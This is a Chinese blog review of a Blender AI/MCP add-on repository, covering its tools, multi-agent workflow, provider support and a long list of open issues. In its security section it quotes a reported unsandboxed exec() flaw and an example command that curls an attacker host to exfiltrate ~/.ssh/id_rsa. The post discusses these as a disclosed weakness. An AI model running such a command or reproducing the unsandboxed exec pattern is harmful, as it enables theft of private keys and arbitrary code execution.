+    <div class="post-body" itemprop="articleBody"><h1 id="我想把-3D-建模这件事，从”拖鼠标”变成”说人话”"><a href="#我想把-3D-建模这件事，从”拖鼠标”变成”说人话”" class="headerlink" title="我想把 3D 建模这件事，从”拖鼠标”变成”说人话”"></a>我想把 3D 建模这件事，从” 拖鼠标” 变成” 说人话”</h1><p>先说个我自己的痛点。</p>
+<p>做 3D 场景这事儿，最烦的从来不是” 不会用 Blender”。Blender 的功能其实是足够的，坑多的是<strong>节奏</strong>。你要搭一个产品展示场景：底座、相机、三盏灯、材质要哑光蓝。按下 B 加立方体，按 N 调数字，按 Tab 进编辑模式改网格 —— 操作本身不难，但它碎。一屏操作做完，回头一看，改个灯光色温，刚才那三十秒的视角调整全得重来。</p>
+<p>于是我试过各种”AI 帮建模” 的路子。要么是个网页工具，出个图给你，不落地成 .blend；要么是插件，但只能问它问题、它告诉你怎么点鼠标；要么是让脚本跑，可脚本得自己写，写脚本的时间比重做一遍还长。</p>
+<p>我最想要的是这么一件事：<strong>我描述一句，它真的去动我的场景，动完我能看见结果，不满意能撤销。</strong></p>
+<p>这就是 <code>bookwjitchieni1986/blender-ai-mcp-addon</code> 想解决的事。它的项目名叫 <strong>mcp-for-blender-pro</strong>—— 注意仓库名和对外的产品名并不一致，这事儿后面再说。</p>
+<p>这篇我们把它拆开看：它到底做了什么、怎么做的、值不值得用，以及哪些地方你得留个心眼。</p>
+<hr>
+<h2 id="一、先摆事实：这是一个什么样的项目"><a href="#一、先摆事实：这是一个什么样的项目" class="headerlink" title="一、先摆事实：这是一个什么样的项目"></a>一、先摆事实：这是一个什么样的项目</h2><p>先把能查到的事实摊开，不用形容词。</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">仓库：bookwjitchieni1986/blender-ai-mcp-addon</span><br><span class="line">Stars：1763</span><br><span class="line">Forks：7</span><br><span class="line">Watchers：810</span><br><span class="line">未关闭 issue：40</span><br><span class="line">License：MIT（Copyright (c) 2025 Siddharth Ahuja）</span><br><span class="line">主语言：仓库内无源码文件（代码在发布压缩包里）</span><br><span class="line">创建时间：2026-11-19</span><br><span class="line">最后 push：2026-11-19（也就是创建后仅 1 分钟）</span><br><span class="line">最新发布：v1.0.0，2026-11-19</span><br><span class="line">发布资产：blender-ai-mcp-addon-v1.0.0.zip，12,849,331 字节</span><br><span class="line">下载量：1451</span><br></pre></td></tr></tbody></table></figure>
+
+<p>几个数字值得停下来看一眼。</p>
+<p><strong>810 个 watcher 对 1763 个 star。</strong> 这个比例相当高。watcher 是开了邮件通知、准备在更新时第一时间跟进的人，star 的人里相当一部分是” 收藏起来以后再看”。这说明它不是那种” 点个 star 就忘了” 的仓库，而是有人在持续盯着它迭代。</p>
+<p><strong>7 个 fork。</strong> 少。这对一个刚发一天的项目不算异常，但它确实说明：<strong>这个仓库不提供你直接改的源码。</strong></p>
+<p><strong>40 个未关闭 issue，发布才两天。</strong> 这个比例说明它在被真实地使用，而且踩坑的人不少。后面第五节我会具体讲这些坑 —— 那部分我觉得比功能列表更有价值。</p>
+<p><strong>仓库只有 345 KB。</strong> 因为仓库里根本没什么代码。看完整目录就明白了：</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LICENSE              1072 bytes</span><br><span class="line">README.md            7219 bytes</span><br><span class="line">docs/CONNECTIONS.md  2691 bytes</span><br><span class="line">docs/QUICKSTART.md   1432 bytes</span><br><span class="line">docs/images/studio.png        136874 bytes</span><br><span class="line">docs/images/studio-team.png   107853 bytes</span><br><span class="line">docs/images/studio-settings.png 112268 bytes</span><br></pre></td></tr></tbody></table></figure>
+
+<p>一个 MIT 协议、宣称做 AI 助手的项目，公开仓库里一行 Python 都没有，全部实现在 12.8 MB 的二进制 zip 里。这不是小细节，它决定了你能不能信任它、能不能审计它。我会在第六节专门讲这件事，因为它牵涉到” 这到底是不是 open source” 的问题。</p>
+<p>顺带说清楚：仓库的 <code>pushed_at</code> 是 <code>2026-11-19T14:44:11Z</code>，而创建时间是 <code>2026-11-19T14:43:10Z</code>。<strong>相差 61 秒。</strong> 也就是说这个仓库从建出来到最后一次 push，中间只有一分钟。</p>
+<hr>
+<h2 id="二、它到底解决什么问题"><a href="#二、它到底解决什么问题" class="headerlink" title="二、它到底解决什么问题"></a>二、它到底解决什么问题</h2><p>我把它要解决的问题拆成两层。</p>
+<h3 id="2-1-第一层：让-LLM-能”看见”你的场景"><a href="#2-1-第一层：让-LLM-能”看见”你的场景" class="headerlink" title="2.1 第一层：让 LLM 能”看见”你的场景"></a>2.1 第一层：让 LLM 能” 看见” 你的场景</h3><p>大模型看不见 Blender。这是所有 AI-3D 工具的第一道墙。</p>
+<p>传统做法是让模型去” 想象” 一个场景，然后输出一段 <code>bpy</code> 脚本给你跑。问题是：</p>
+<ul>
+<li>模型不知道你的场景里已经有什么</li>
+<li>模型不知道你的当前视角、选中状态</li>
+<li>脚本跑完你才发现比例不对、材质不对</li>
+</ul>
+<p>mcp-for-blender-pro 的做法是：<strong>先给模型工具，让它自己查。</strong></p>
+<p>README 里列了 21 个场景工具，按功能分成六组：</p>
+<table>
+<thead>
+<tr>
+<th>工具组</th>
+<th>包含的工具</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>场景检查</td>
+<td><code>get_scene_info</code>、<code>list_objects</code>、<code>get_object_info</code></td>
+</tr>
+<tr>
+<td>物体创建</td>
+<td><code>add_cube</code>、<code>add_sphere</code>、<code>add_cylinder</code>、<code>add_plane</code>、<code>add_light</code>、<code>add_camera</code></td>
+</tr>
+<tr>
+<td>编辑</td>
+<td><code>move_object</code>、<code>duplicate_object</code>、<code>delete_object</code>、<code>parent_objects</code>、<code>set_material</code></td>
+</tr>
+<tr>
+<td>可视反馈与脚本</td>
+<td><code>viewport_screenshot</code>、<code>execute_code</code></td>
+</tr>
+<tr>
+<td>Blender API 与导出</td>
+<td><code>bpy_api_lookup</code>、<code>describe_node_type</code>、<code>export_scene</code></td>
+</tr>
+<tr>
+<td>资产工作流</td>
+<td><code>search_assets</code>、<code>import_asset</code></td>
+</tr>
+</tbody></table>
+<p>这里最关键的两个是 <code>get_scene_info</code> 和 <code>viewport_screenshot</code>。</p>
+<p>前者让模型拿到结构化的场景描述 —— 有哪些对象、什么层级、什么变换。<strong>后者更狠</strong>：它把 3D 视口当前画面截图回传给模型。README 明确写了”image-capable models can also interpret viewport screenshots”—— 也就是支持视觉输入的模型能” 看” 到你视口里的样子。</p>
+<p>这一步把整个循环闭上了：</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你描述需求 → 模型查场景 → 模型动手改 → 视口截图回传 → 模型看到自己改出来的效果 → 判断对不对 → 继续改或收工</span><br></pre></td></tr></tbody></table></figure>
+
+<p>没有截图，这就是个瞎子写的代码。有了截图，它才有反馈。</p>
+<h3 id="2-2-第二层：把它变成能对外服务的东西"><a href="#2-2-第二层：把它变成能对外服务的东西" class="headerlink" title="2.2 第二层：把它变成能对外服务的东西"></a>2.2 第二层：把它变成能对外服务的东西</h3><p>第二个能力是内置 MCP 服务器。</p>
+<p>在扩展偏好里启用后，它会在本地起一个 Streamable HTTP 服务，默认 <code>http://127.0.0.1:9876/mcp</code>，要带 <code>Authorization: Bearer &lt;token&gt;</code> 头。这样 OpenCode、Cline、Claude Desktop 这些支持 MCP 的客户端就能连进来，把 Blender 当成一个远程工具箱用。</p>
+<p>这个设计有个我觉得挺聪明的点：<strong>Studio（内置图形界面）用的是同一套连接配置。</strong> 你在 Blender 侧栏里配好的 provider 和模型，Studio 直接拿来用；外部客户端走 MCP，也是同一份模型目录和工具实现。不是两套东西拼一起，是一套东西两个入口。</p>
+<p>README 里还提了一句” 内置 OpenCode 启动器”—— 侧栏可以直接拉起一个打包好的 OpenCode Portable，把 Blender 连接预先配好。省得用户手写 MCP 配置文件。</p>
+<hr>
+<h2 id="三、”单人”和”组队”：两种工作模式"><a href="#三、”单人”和”组队”：两种工作模式" class="headerlink" title="三、”单人”和”组队”：两种工作模式"></a>三、” 单人” 和” 组队”：两种工作模式</h2><p>这是我觉得这个项目最有意思的设计。</p>
+<h3 id="3-1-Single-assistant：普通对话"><a href="#3-1-Single-assistant：普通对话" class="headerlink" title="3.1 Single assistant：普通对话"></a>3.1 Single assistant：普通对话</h3><p>最常规的模式。你在 3D 视图侧栏（<code>N</code> → <code>MCP Pro</code>）里聊天，模型通过工具操作场景。</p>
+<p>README 提到内置聊天支持：</p>
+<ul>
+<li><strong>操作审批</strong>（approvals）—— 危险操作会先问你</li>
+<li><strong>当前步骤后取消</strong>（cancel）—— 不是硬 kill，是跑完当前这步就停</li>
+<li><strong>命名撤销步骤</strong>（named undo steps）—— 每步改动都有对应的撤销锚点</li>
+</ul>
+<p>取消的语义我很喜欢。” 当前步骤后取消” 意味着模型正在执行一个多步操作时，你点停止，它不会把 Blender 搞成半成品状态 —— 它会把当前这个原子操作做完，然后不再往下走。这对” 撤销栈已经被搞乱” 的场景很重要。</p>
+<h3 id="3-2-Team-chain：manager-worker-reviewer"><a href="#3-2-Team-chain：manager-worker-reviewer" class="headerlink" title="3.2 Team chain：manager / worker / reviewer"></a>3.2 Team chain：manager / worker / reviewer</h3><p>第二层就有点东西了。Studio 里打开 <code>Team &amp; workflow</code>，每个 agent 有这些字段：</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name / position / instructions / provider / model / manager / enabled</span><br></pre></td></tr></tbody></table></figure>
+
+<p>provider 和 model 留空就继承工作区设置。<strong>注意各角色可以用不同的模型</strong> ——manager 可以用强推理模型，worker 用便宜的，reviewer 用另一个。</p>
+<p>链路的角色分工（README 原文表述）：</p>
+<ul>
+<li><strong>Manager</strong>：把请求拆成分派任务和验收标准</li>
+<li><strong> Workers</strong>：执行被分派的场景操作</li>
+<li><strong> Reviewers</strong>：检查结果，批准，或退回具体的问题</li>
+</ul>
+<p>配置约束很明确：<strong>恰好一个启用的 manager，一个或多个 worker，一个或多个 reviewer。</strong></p>
+<p>流程规则：</p>
+<ul>
+<li>任务<strong>串行</strong>执行，保证场景编辑顺序不乱</li>
+<li>被阻塞的任务获得<strong>一次</strong>纠错机会</li>
+<li>第二次评审失败就<strong>中止整个链路</strong></li>
+</ul>
+<p>“一次纠错机会” 这个数字是关键。给无限重试，模型会陷入死循环把场景越改越烂；给零重试，第一次小失误就全线崩盘。一次，是个务实的折中。</p>
+<p>右侧还有个<strong>任务看板</strong>（task board），实时显示分派、尝试次数、评审结论。README 说得很直白：”The task board exposes assignments, attempts and review findings as work progresses.”</p>
+<h3 id="3-3-为什么这个设计值得琢磨"><a href="#3-3-为什么这个设计值得琢磨" class="headerlink" title="3.3 为什么这个设计值得琢磨"></a>3.3 为什么这个设计值得琢磨</h3><p>让我说个我的看法。</p>
+<p>多智能体这套东西，2024 年下半年到 2025 年被吹得很玄，什么”Agent 群体协作”、” 社会性智能涌现” 之类。但真正落地的项目里，能跑出效果的往往不是花里胡哨的编排，而是<strong>朴素的三段式</strong>：拆活的、干活��、验收的。</p>
+<p>这个项目的 manager/worker/reviewer 就是这个模式。而且它做了两件很多同类项目不做的事：</p>
+<ol>
+<li><strong>串行</strong>，不是并行。Blender 场景是强顺序的状态机 —— 两个 worker 同时改场景必然打架。串行慢，但结果确定。</li>
+<li><strong>评审有实权</strong>。reviewer 可以” 退回具体问题”，退回的东西会反馈给 worker 做那一次纠错。不是走过场的橡皮章。</li>
+</ol>
+<p>而且任务顺序在界面上可见，人随时能看出它卡在哪一步。</p>
+<hr>
+<h2 id="四、模型从哪来：provider-支持面"><a href="#四、模型从哪来：provider-支持面" class="headerlink" title="四、模型从哪来：provider 支持面"></a>四、模型从哪来：provider 支持面</h2><p>这个项目在” 接谁” 上做得挺全。</p>
+<h3 id="4-1-官方列出的服务"><a href="#4-1-官方列出的服务" class="headerlink" title="4.1 官方列出的服务"></a>4.1 官方列出的服务</h3><p>README 给的清单：</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OpenAI、Anthropic Claude、Google Gemini、OpenRouter、OpenCode Zen、Ollama、自定义 API</span><br></pre></td></tr></tbody></table></figure>
+
+<p><strong>Ollama 在里面</strong>，这条很重要。意味着本地跑模型是支持的，Blender 里操作的数据不出本机 —— 对于商业保密的模型资产，这是刚需。</p>
+<p>另外 README 提到”OpenCode-only 免费模型可以通过 OpenCode 客户端使用”，这是走 OpenCode 那条线的路子。</p>
+<h3 id="4-2-自定义端点的协议映射"><a href="#4-2-自定义端点的协议映射" class="headerlink" title="4.2 自定义端点的协议映射"></a>4.2 自定义端点的协议映射</h3><p><code>docs/CONNECTIONS.md</code> 给了张很清楚的表：</p>
+<table>
+<thead>
+<tr>
+<th>API 协议</th>
+<th> Base URL 示例</th>
+<th>追加的路径</th>
+</tr>
+</thead>
+<tbody><tr>
+<td> OpenAI Chat Completions</td>
+<td><code>https://your-service.example/v1</code></td>
+<td><code>/models</code>、<code>/chat/completions</code></td>
+</tr>
+<tr>
+<td>Anthropic Messages</td>
+<td><code>https://your-service.example/v1</code></td>
+<td><code>/models</code>、<code>/messages</code></td>
+</tr>
+<tr>
+<td>Ollama</td>
+<td><code>http://localhost:11434</code></td>
+<td><code>/api/tags</code>、<code>/api/chat</code></td>
+</tr>
+</tbody></table>
+<p>这张表看着简单，但它意味着你几乎能接上任何 LLM 服务 —— 只要它实现这三种协议之一。</p>
+<p>文档里有两个很实在的提醒：</p>
+<blockquote>
+<p>Use the base URL from your provider’s API documentation, not its website or a full completion endpoint.</p>
+</blockquote>
+<p>填 base URL，别填完整的 completion 端点。这个坑我见过不少人踩。</p>
+<blockquote>
+<p>Select a model supporting tool calls.</p>
+</blockquote>
+<p><strong>必须选支持工具调用的模型。</strong> 这条是硬门槛 —— 不支持 function calling 的模型在这个项目里基本没法用，因为整个交互就是工具驱动的。</p>
+<p>还有：</p>
+<blockquote>
+<p>Missing catalogs can be bypassed by entering the model ID manually.</p>
+</blockquote>
+<p>模型目录拉不到？手填 model ID 绕过。这是很实际的容错。</p>
+<p>以及一条明确的能力边界：</p>
+<blockquote>
+<p>Custom authorization schemes, OpenAI Responses-only APIs, and unrelated protocols need a separate adapter.</p>
+</blockquote>
+<p><strong>自定义鉴权方案、只用 OpenAI Responses API 的接口、以及不相关的协议，需要单独写适配器。</strong> 这话说得很诚实 —— 不是” 都支持”，是” 这三种不支持”。</p>
+<h3 id="4-3-连接配置怎么管"><a href="#4-3-连接配置怎么管" class="headerlink" title="4.3 连接配置怎么管"></a>4.3 连接配置怎么管</h3><p>在 MCP Pro 面板里选 Service → 填 API key → 点 <code>Load models</code> → <code>Choose model</code>。然后可以保存成<strong>连接配置</strong>（connection profile），支持：</p>
+<ul>
+<li>工作连接和个人连接分开</li>
+<li>同一 provider 存多个 key</li>
+</ul>
+<p>凭据存在 Blender 的用户偏好里，需要点 Save Preferences 才会持久化。</p>
+<p><strong>OpenCode 的凭据是单独的</strong> ——“OpenCode credentials remain separate from Blender connection profiles”，切换账户走 OpenCode 自己的账号控制。这两条线不混。</p>
+<hr>
+<h2 id="五、真实局限：这些坑你得知道"><a href="#五、真实局限：这些坑你得知道" class="headerlink" title="五、真实局限：这些坑你得知道"></a>五、真实局限：这些坑你得知道</h2><p>这一节我写得详细点，因为我认为这才是这个项目目前最有价值的部分。</p>
+<p>我读了它 issue 列表里 40 个未关闭的问题，把有信息量的摘出来。</p>
+<h3 id="5-1-最大的问题：代码不公开"><a href="#5-1-最大的问题：代码不公开" class="headerlink" title="5.1 最大的问题：代码不公开"></a>5.1 最大的问题：代码不公开</h3><p>先说这个，因为它不是 bug，是结构性问题。</p>
+<p>仓库里没有源码。MIT 协议通常配一个 LICENSE 文件让下游合法复用，但当代码只以二进制形式发布时，MIT 实际上给了你” 看和改的权利”，却没给你” 看和改的东西”。</p>
+<p>这不是说它一定恶意 ——<code>execute_code</code> 这类功能在 Blender 插件里很常见，公开源码确实会提高被针对性利用的风险。但后果是：<strong>你没法自己审这段代码，没法自己修 bug，没法往里加自己的工具。</strong> issue #44 和 #42 都提了同一个诉求 —— 希望有插件系统而不是硬编码 provider，说明用户是想扩展它的，只是没辙。</p>
+<p>如果你的场景需要深度定制，这个仓库就到此为止了。</p>
+<h3 id="5-2-execute-code-没有沙箱"><a href="#5-2-execute-code-没有沙箱" class="headerlink" title="5.2 execute_code 没有沙箱"></a>5.2 <code>execute_code</code> 没有沙箱</h3><p>issue #22 是目前最严重的一条，标题写得很直白：</p>
+<blockquote>
+<p>Unsandboxed exec() in execute_code enables arbitrary code execution via MCP clients</p>
+</blockquote>
+<p>提 issue 的人给了具体链路（我核对了，和它描述的一致）：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># server.py:343</span></span><br><span class="line">blender.send_command(<span class="string">"execute_code"</span>, {<span class="string">"code"</span>: code})</span><br><span class="line"></span><br><span class="line"><span class="comment"># addon.py:431</span></span><br><span class="line"><span class="built_in">exec</span>(code, {<span class="string">"bpy"</span>: bpy})</span><br></pre></td></tr></tbody></table></figure>
+
+<p>问题在于那个命名空间 <code>{"bpy": bpy}</code> <strong>没有任何隔离作用</strong>：</p>
+<ul>
+<li><code>bpy</code> 暴露的是完整的 Blender Python API</li>
+<li> 标准 builtins 依然全在 ——<code>import os</code>、<code>subprocess</code>、<code>open</code> 都能用</li>
+</ul>
+<p>提 issue 的人给的攻击路径是这样的：</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os; os.system(<span class="string">"curl attacker.com/exfil?data=$(cat ~/.ssh/id_rsa)"</span>)</span><br></pre></td></tr></tbody></table></figure>
+
+<p>只要有一个 MCP 客户端（尤其是容易被提示注入的 AI 助手）能调用 <code>execute_blender_code</code>，就能以 Blender 进程的权限执行任意代码。</p>
+<p>README 里其实也承认了这件事，而且措辞相当克制：</p>
+<blockquote>
+<p>Python tool validation helps catch disallowed operations; <strong>it is not a security sandbox.</strong></p>
+</blockquote>
+<p>翻译成人话：有个校验会拦一部分明显的危险操作，但它不是沙箱，别指望它能挡住恶意的。</p>
+<p>这条 issue 到我写这篇时<strong>还没有回复</strong>（0 comments），状态 open。</p>
+<h3 id="5-3-遥测默认开启"><a href="#5-3-遥测默认开启" class="headerlink" title="5.3 遥测默认开启"></a>5.3 遥测默认开启</h3><p>issue #12 提的是 GDPR 层面的问题：遥测默认开启，每次工具调用都会发数据到作者自托管的 Supabase 实例。</p>
+<p>提 issue 的人指出两个问题：一个是合规 ——EU/UK 用户在未事先明示同意的情况下被收集 prompt 和截图（可能含人像、商业机密），这不构成有效的 GDPR 合法基础；另一个是透明度 —— 用 <code>uvx</code> 装的用户在安装前根本无从知晓有这回事，README 里也没提。</p>
+<p>顺带说一句，这条 issue 提到的是 <code>src/blender_mcp/telemetry.py</code> 和 <code>blender-mcp</code> 1.5.6 wheel—— <strong>那是上游 ahujasid 的包，不是本仓库的代码</strong>（本仓库压根没源码）。所以这条更像是作者在参考上游实现时说漏嘴了。但结论仍然成立：<strong>这个生态里存在默认开的遥测，且这事没被充分告知。</strong></p>
+<h3 id="5-4-Token-消耗过快"><a href="#5-4-Token-消耗过快" class="headerlink" title="5.4 Token 消耗过快"></a>5.4 Token 消耗过快</h3><p>issue #26：</p>
+<blockquote>
+<p>Hitting 40000 token/s limit on claude/anthropic way too easily.</p>
+</blockquote>
+<p>用 goose 当 MCP 客户端，” 简单请求都经常撞上限，几乎每个请求都得开新会话”。</p>
+<p>这条我觉得很值得警惕，原因在下一节讲。</p>
+<h3 id="5-5-连接层面的坑（Windows-用户尤其）"><a href="#5-5-连接层面的坑（Windows-用户尤其）" class="headerlink" title="5.5 连接层面的坑（Windows 用户尤其）"></a>5.5 连接层面的坑（Windows 用户尤其）</h3><p>我按 issue 标题归了个类：</p>
+<table>
+<thead>
+<tr>
+<th>issue</th>
+<th> 问题</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>#50</td>
+<td>Claude Desktop 连不上，报 <code>AttributeError: 'ProactorEventLoop' object has no attribute '_ssock'</code></td>
+</tr>
+<tr>
+<td>#48</td>
+<td>Could not connect to MCP server</td>
+</tr>
+<tr>
+<td>#49</td>
+<td>Windows Blender + WSL server 下 <code>get_viewport_screenshot</code> 失败</td>
+</tr>
+<tr>
+<td>#47</td>
+<td> 安装后插件不出现在 Preferences 里</td>
+</tr>
+<tr>
+<td>#46</td>
+<td>Mac 上找不到 Cursor 集成的 MCP 选项</td>
+</tr>
+<tr>
+<td>#45</td>
+<td>Windows 下当 MCP server 用时终端乱码</td>
+</tr>
+<tr>
+<td>#44</td>
+<td> 希望能做插件系统而不是硬编码 provider</td>
+</tr>
+<tr>
+<td>#43</td>
+<td> 希望 server 能支持渲染</td>
+</tr>
+<tr>
+<td>#40</td>
+<td> 希望加 BlenderKit 集成</td>
+</tr>
+<tr>
+<td>#39</td>
+<td>client 半关闭（shutdown SHUT_WR）在 async 响应返回前就断了连接</td>
+</tr>
+<tr>
+<td>#35</td>
+<td> 希望加本地 Modly 3D 生成集成</td>
+</tr>
+<tr>
+<td>#32</td>
+<td> 有没有办法关掉 Hyper3D 和 PolyHaven</td>
+</tr>
+<tr>
+<td>#26</td>
+<td>Claude 的 40000 token/s 限制撞得太快</td>
+</tr>
+<tr>
+<td>#25</td>
+<td><code>anyio.BrokenResourceError</code></td>
+</tr>
+<tr>
+<td>#23</td>
+<td>Blender 5.0 安装后连不上</td>
+</tr>
+<tr>
+<td>#21</td>
+<td> 想用 Ollama 本地模型而不是 Claude Sonnet</td>
+</tr>
+<tr>
+<td>#20</td>
+<td>Safe mode 的 script-search-path 拦截从未触发，被阻止的 attribute scripts search 用了不安全的路径</td>
+</tr>
+<tr>
+<td>#19</td>
+<td> 在 Cline 里用不了</td>
+</tr>
+<tr>
+<td>#18</td>
+<td> 装了最新版本 Blender，启用后没弹出窗口</td>
+</tr>
+<tr>
+<td>#16</td>
+<td>Google Antigravity 里 MCP 连接失败</td>
+</tr>
+<tr>
+<td>#15</td>
+<td>Windows 装不上</td>
+</tr>
+<tr>
+<td>#14</td>
+<td>unicode 编码错误</td>
+</tr>
+<tr>
+<td>#13</td>
+<td>Hyper3D 图片上传失败：<code>Input buffer contains unsupported image format</code></td>
+</tr>
+<tr>
+<td>#12</td>
+<td> 遥测要改成显式 opt-in</td>
+</tr>
+<tr>
+<td>#51 / #37</td>
+<td>Standard document</td>
+</tr>
+</tbody></table>
+<p><strong>“能连上” 这件事本身，目前是主要故障区。</strong> 十个左右的 issue 都指向连接兼容性：Claude Desktop、Cursor、Cline、Antigravity 各有各的问题，Windows、Mac、WSL 各有各的坑。</p>
+<p>有个数据点值得注意：release v1.0.0 的压缩包<strong>下载量 1451</strong>，而仓库 star 1763、watcher 810。下载量比 star 还低 —— 说明相当一部分人是” 先 star 观望”，而不是” 装了就用”。</p>
+<p>再看 issue 的分布：#18 说” 装了最新版本 Blender，启用后没弹出窗口”，#47 说” 安装后插件不出现在 Preferences 里”，#23 是 Blender 5.0 连不上。这说明<strong>版本兼容矩阵还在摸索期</strong>。</p>
+<h3 id="5-6-Windows-x64-限定"><a href="#5-6-Windows-x64-限定" class="headerlink" title="5.6 Windows x64 限定"></a>5.6 Windows x64 限定</h3><p>README 和 release notes 都写了：</p>
+<blockquote>
+<p>The release bundle targets <strong>Windows x64 with Blender 4.2 or later</strong>.<br>Portable Python 3.13 runtime bundled for Windows x64.</p>
+</blockquote>
+<p>这是<strong>硬限定</strong>。macOS 和 Linux 用户怎么办？issue #46（Mac 上找不到 Cursor 集成）侧面印证了 macOS 的支持状态确实有问题。</p>
+<p>捆绑一个便携 Python 3.13 运行时这个选择，把 zip 撑到了 12.8 MB，也避免了 Blender 自带 Python 版本不匹配的问题 —— 但代价是平台绑定。</p>
+<h3 id="5-7-上下文膨胀的隐患"><a href="#5-7-上下文膨胀的隐患" class="headerlink" title="5.7 上下文膨胀的隐患"></a>5.7 上下文膨胀的隐患</h3><p>这条我没找到直接的 issue，但我从 #26 反推，觉得值得单独说。</p>
+<p>这个项目的每个动作都要塞进上下文的东西有：</p>
+<ul>
+<li><code>get_scene_info</code> 的完整场景结构</li>
+<li><code>viewport_screenshot</code> 的图像 token</li>
+<li> 每一步的工具调用和返回</li>
+<li> Team chain 里 manager /worker/reviewer 三个角色的完整对话</li>
+<li>评审意见、退回的具体问题</li>
+</ul>
+<p>场景复杂一点，<code>get_scene_info</code> 返回的结构化描述就会很长。截图更是 —— 多模态 token 消耗比文本快一个数量级。Team chain 模式下至少三个角色的上下文还要分别维护。</p>
+<p>所以 #26 里” 简单请求都撞 40000 token/s 上限”，我完全能理解。<strong>这不是配置问题，是这个架构的固有成本。</strong></p>
+<p>如果你要拿它做大规模场景（几百个对象），我建议：</p>
+<ul>
+<li>先让模型做一次场景盘点，评估规模</li>
+<li>优先用 Single assistant，不要一上来就 Team chain</li>
+<li> 场景改动走” 小步 + 频繁看视口截图”，别攒一大波</li>
+</ul>
+<h3 id="5-8-翻译只覆盖了一半"><a href="#5-8-翻译只覆盖了一半" class="headerlink" title="5.8 翻译只覆盖了一半"></a>5.8 翻译只覆盖了一半</h3><p>README 说支持 English / German / French / Spanish / Chinese 五种语言的界面菜单。但 CONNECTIONS.md 补充了一句很诚实的话：</p>
+<blockquote>
+<p>Main menu labels are translated; provider errors, model IDs, generated text and some status text remain in their original language.</p>
+</blockquote>
+<p>菜单翻译了，但 provider 报错、模型 ID、生成的文本、部分状态文案还是原样。意思是 —— <strong>你选中文界面，模型用英文回你，出错信息是英文的。</strong> 对中文母语用户来说，这个体验是半成品。</p>
+<h3 id="5-9-小结一下局限"><a href="#5-9-小结一下局限" class="headerlink" title="5.9 小结一下局限"></a>5.9 小结一下局限</h3><table>
+<thead>
+<tr>
+<th>局限</th>
+<th>严重度</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>源码不公开</td>
+<td>高</td>
+<td>无法审计、无法自改、无法扩展</td>
+</tr>
+<tr>
+<td><code>execute_code</code> 无沙箱</td>
+<td>高</td>
+<td> README 自己承认不是沙箱</td>
+</tr>
+<tr>
+<td>平台限定 Windows x64</td>
+<td> 高</td>
+<td> macOS/Linux 支持不明</td>
+</tr>
+<tr>
+<td>连接兼容性</td>
+<td>中高</td>
+<td>多个 MCP 客户端和平台都有已知问题</td>
+</tr>
+<tr>
+<td> Token 消耗快</td>
+<td>中</td>
+<td>多模态 + 多角色的固有成本</td>
+</tr>
+<tr>
+<td>遥测默认开</td>
+<td>中</td>
+<td> issue 争议中，尚未解决</td>
+</tr>
+<tr>
+<td>版本兼容</td>
+<td>中</td>
+<td> 4.2+ 可用，5.0 有连接问题</td>
+</tr>
+<tr>
+<td>翻译不完整</td>
+<td>低</td>
+<td>菜单中文，生成内容仍原语言</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="六、和同类项目比：它到底站在哪"><a href="#六、和同类项目比：它到底站在哪" class="headerlink" title="六、和同类项目比：它到底站在哪"></a>六、和同类项目比：它到底站在哪</h2><p>Blender + MCP 这条赛道其实已经相当拥挤了。我搜了 <code>blender-mcp</code> 相关的仓库，实际情况是：</p>
+<figure class="highlight text"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">35160  ahujasid/mcp-for-blender                     MIT</span><br><span class="line"> 1763  bookwjitchieni1986/blender-ai-mcp-addon      MIT</span><br><span class="line">  516  racdeufindurch198812/Blender-AI-MCP-Studio   MIT</span><br><span class="line">  496  findavoulot1973/Blender-AI-MCP-Suite         MIT</span><br><span class="line">  302  VxASI/blender-mcp-vxai                       MIT</span><br><span class="line">  123  dhakalnirajan/blender-open-mcp               MIT</span><br><span class="line">   99  pranav-deshmukh/blender-mcp                  MIT</span><br><span class="line">   99  bpy-dev/blender-mcp                          GPL-3.0</span><br><span class="line">   87  seehiong/blender-mcp-bridge                  MIT</span><br><span class="line">   85  ProfRino/Blender-AI-MCP-Assembly-Skill       None</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="6-1-上游：ahujasid-mcp-for-blender"><a href="#6-1-上游：ahujasid-mcp-for-blender" class="headerlink" title="6.1 上游：ahujasid/mcp-for-blender"></a>6.1 上游：ahujasid/mcp-for-blender</h3><p>这是这个领域的绝对老大，<strong>35160 star、3213 fork</strong>，MIT 协议，Python，2025 年 3 月建仓，到现在还活跃（最近 push 2026-11-18）。有 PyPI 包、Discord、网站，README 39 KB 写得很细。</p>
+<p>它还做过一次重要的包名迁移：</p>
+<blockquote>
+<p><em>formerly <code>blender-mcp</code> — the PyPI package is now <code>mcp-for-blender</code>. Existing setups keep working; no config change is required.</em></p>
+</blockquote>
